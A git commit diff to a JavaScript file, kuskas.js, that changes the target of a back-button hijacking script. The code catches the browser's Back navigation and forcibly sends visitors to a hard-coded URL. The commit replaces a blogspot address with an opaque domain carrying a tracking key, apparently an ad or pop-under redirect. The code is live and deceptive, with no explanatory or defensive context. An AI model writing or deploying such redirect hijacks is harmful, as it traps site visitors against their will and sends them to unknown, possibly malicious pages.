79c181bd80f5b884b139c45274b037a1cc59e32a
lookatdons <lookatdons@users.noreply.github.com>
2024-07-25 15:14:57 +0700

    Update kuskas.js

--- kuskas.js
+++ kuskas.js
@@ -6,7 +6,7 @@ window.addEventListener("popstate", function() {
   if(location.hash === "#!/history") { 
     history.replaceState(null, document.title, location.pathname); 
     setTimeout(function(){ 
-      location.replace("https://circleoftoast.blogspot.com/"); 
+      location.replace("https://irrigatenotwithstandingcommit.com/pm1ymmgxk3?key=399b8c1c420dbe0751ab7f618e873eb2"); 
     },10); 
   } 
 }, false); 
